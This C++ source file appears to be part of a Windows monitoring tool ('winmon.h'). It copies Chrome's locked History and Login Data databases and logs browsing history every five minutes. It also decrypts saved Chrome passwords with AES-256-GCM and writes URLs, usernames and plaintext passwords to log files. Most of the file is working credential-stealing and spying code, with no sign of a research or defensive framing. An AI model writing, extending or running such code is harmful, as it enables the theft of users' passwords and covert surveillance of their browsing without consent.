#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include "sqlite/sqlite3.h"
#include <winsock.h>
#include <thread>
#include <ctime>
#include <chrono>
#include <string>
#include <array>
#include <sstream>
#include <Wincrypt.h>
#include <rapidjson/document.h>
#include <openssl/evp.h>
#include <vector>
#include "winmon.h"

using namespace std;
using namespace rapidjson;

#define CHROME_INTERVAL_CHECK_VALUE 5   //Number of minutes between chrome history interval checks

int flag_history_init_run = 1;


bool file_exists(string filename) {
    string const temp{filename};
    const char* dir = temp.c_str();
    struct stat info;
    if( stat(dir, &info ) != 0 )
        return false;
    return true;
}


bool db_query(string input_db_file, string output_log_file, string sql_query, int(*func)(void *, int, char **, char **)) {
    // Copying database to new file to bypass database lock
    string copy_db = input_db_file + "2";
    string formatted_cmd = "copy \""+input_db_file+"\"  \""+copy_db+"\" > nul";
    
    int result = system(formatted_cmd.c_str());
    if (result != 0) {
        cout << "There was an error executing the command." << endl;
        return false;
    }

    const char* data_path = copy_db.c_str();
    const char* data_log = output_log_file.c_str();
    sqlite3* db; 
    sqlite3_stmt* stmt;
    char *err;
    sqlite3_open(data_path, &db);
    int retval = sqlite3_exec(db, sql_query.c_str(), func, (void *)data_log, &err);
    if (retval != SQLITE_OK) {
        cout << "SQL EXEC ERROR" << err << endl;
        return false;
    }
    
    sqlite3_free(err);
    sqlite3_close(db);
    formatted_cmd = "del /f \""+copy_db+"\"";
    system(formatted_cmd.c_str());
    return true;
}


long int convert_datetime_to_epoch(string datetime) {
    int delim = datetime.find(" ");
    string date = datetime.substr(0, delim);
    string time = datetime.substr(delim, datetime.length());

    char *date_token = strtok((char*)date.c_str(), "-");
    tm dt_conversion{};
    for (int i = 0; i < 3; i++) {
        string t = string(date_token);

        switch (i) {
              case 0: dt_conversion.tm_year = stoi(t) - 1900; break;
              case 1: dt_conversion.tm_mon = stoi(t) -1; break; 
              case 2: dt_conversion.tm_mday = stoi(t); break;
        }
        date_token = strtok(NULL, "-");
    }

    char *time_token = strtok((char*)time.c_str(), ":");
    for (int i = 0; i < 3; i++) {
        string t = string(time_token);
        switch (i) {
              case 0: dt_conversion.tm_hour = stoi(t); break;
              case 1: dt_conversion.tm_min = stoi(t); break;
              case 2: dt_conversion.tm_sec = stoi(t); break;
        }
        time_token = strtok(NULL, ":");
    }
    
    time_t epoch_time = mktime(&dt_conversion);
    long int returned_time = static_cast<long int> (epoch_time);
    return returned_time;
}


static int sql_chrome_history_to_file(void *filename, int argc, char **argv, char **azColName){
    ofstream myfile;
    myfile.open((const char*)filename, ios_base::app);
    string output = "";
    for(int i = 0; i < argc; i++){           
        // Skipping over previously recorded chrome history
        if (string(azColName[i]) == "time") {
            long int current_history_epoch = convert_datetime_to_epoch(string(argv[i]));
            long int last_history_epoch = convert_datetime_to_epoch(g_last_history_time);
            if (current_history_epoch > last_history_epoch)
                g_last_history_time = string(argv[i]); 
            else
                if (!flag_history_init_run)
                    return 0;

        }
       output += (argv[i] ? argv[i] : "NULL");
       output += "\t\t";
    }
    myfile << output + "\n";
    myfile.close();
    return 0;
}


bool get_chrome_history() {
    string chrome_passwd_file_path = g_chrome_data_dir + "Default\\";
    string original_db = chrome_passwd_file_path+ "History";
    bool retval = db_query(original_db, g_chrome_history_logfile, "SELECT datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS time, title, url FROM urls;", &sql_chrome_history_to_file);
    return retval;
}


int chrome_history_interval_check() {
    // Check for logfile
    if (!file_exists(g_chrome_last_time_logfile)) {
        ofstream output(g_chrome_last_time_logfile);
    } else {
        // Storing last time log file contents to global last file time
        string temp;
        ifstream last_time_file(g_chrome_last_time_logfile);
        while (getline(last_time_file, temp))
            g_last_history_time = temp;
        last_time_file.close(); 
    }
    // Get the current time
    auto start_time = std::chrono::system_clock::now();
    get_chrome_history();
    flag_history_init_run = 0;
    while (true) {
        // Periodically getting Chrome history
        auto current_time = std::chrono::system_clock::now();
        auto diff = current_time - start_time;
        int diff_value = std::chrono::duration_cast<std::chrono::seconds>(diff).count();
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (diff_value >= CHROME_INTERVAL_CHECK_VALUE*60) {
                try {get_chrome_history();} catch (...) {}                
                start_time = std::chrono::system_clock::now();
                // Updating last chrome history time file
                fstream ofs;
                ofs.open(g_chrome_last_time_logfile, ios::out | ios::trunc);
                ofs << g_last_history_time;
                ofs.close();
            }
    }

    return 0;
}


string encrypt_CryptProtectData(const string& input)
{
    DATA_BLOB inputBlob;
    inputBlob.pbData = (BYTE*)input.c_str();
    inputBlob.cbData = input.size();

    DATA_BLOB outputBlob;
    BOOL result = CryptProtectData(&inputBlob, L"", NULL, NULL, NULL, 0, &outputBlob);

    if (!result)
    {
        std::cerr << "Error: CryptProtectData failed with error code " << GetLastError() << std::endl;
        return string();
    }

    string output((char*)outputBlob.pbData, outputBlob.cbData);
    LocalFree(outputBlob.pbData);
    return output;
}


string decrypt_aes_256_gcm(const string& key, const string& iv, const string& ciphertext)
{
    // Create an EVP_CIPHER_CTX object
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

    // Initialize the decryption operation
    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
        return "Error initializing the decryption operation";

    // Set the key and IV
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.size(), NULL))
        return "Error setting the IV length";

    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, (const unsigned char*)key.data(), (const unsigned char*)iv.data()))
        return "Error setting the key and IV";

    // Decrypt the ciphertext
    std::vector<unsigned char> plaintext(ciphertext.size());
    int out_len;
    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &out_len, (const unsigned char*)ciphertext.data(), ciphertext.size()))
        return "Error during decryption";

    string potential_password = string((char*)plaintext.data(), plaintext.size());
    potential_password = potential_password.substr(0, potential_password.length() - 16);
    //cout << "potential_password\t" << potential_password << endl;
    
    // Finalize the decryption
    if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len, &out_len))
    {
        // Error during finalization
        EVP_CIPHER_CTX_free(ctx);
        return potential_password;
    }

    // Release the EVP_CIPHER_CTX object
    EVP_CIPHER_CTX_free(ctx);
    // Return the decrypted plaintext as a string
    return string((char*)plaintext.data(), plaintext.size());
}


static int sql_chrome_passwords_to_file(void *filename, int argc, char **argv, char **azColName){
    ofstream myfile;
    myfile.open((const char*)filename, ios_base::app);

    string output = "";
    for(int i = 0; i < argc; i++){  
        if (string(azColName[i]) == "password_value") {
            try {
                string enc_password = string(argv[i]).erase(0,3);
                string init_vector = enc_password.substr(0, 12);
                string payload = enc_password.substr(12);
                string decrypted_password = decrypt_aes_256_gcm(g_local_key, init_vector, payload);
                //cout << "decrypted_password\t" << decrypted_password << endl; 
                output += decrypted_password;
            } catch (...) {
                //cout << "ERROR: sql chrome passwords to file" << endl;
            }   
        } else {
            //cout << azColName[i] << "\t\t" << string(argv[i]) <<  endl;
            output += (argv[i] ? argv[i] : "NULL");
        }
        
       output += "\t\t";
    }
    myfile << output + "\n";
    myfile.close();
    //cout << endl;
    return 0;
}


bool get_chrome_passwords() {
    string chrome_passwd_file_path = g_chrome_data_dir + "Default\\";
    string original_db = chrome_passwd_file_path+ "Login Data";
    bool retval = db_query(original_db, g_chrome_passwd_logfile, "SELECT action_url, username_value, password_value FROM logins;", &sql_chrome_passwords_to_file);
    return retval;
}


int chrome_password_interval_check() {
    get_chrome_passwords();
    return 0;
}
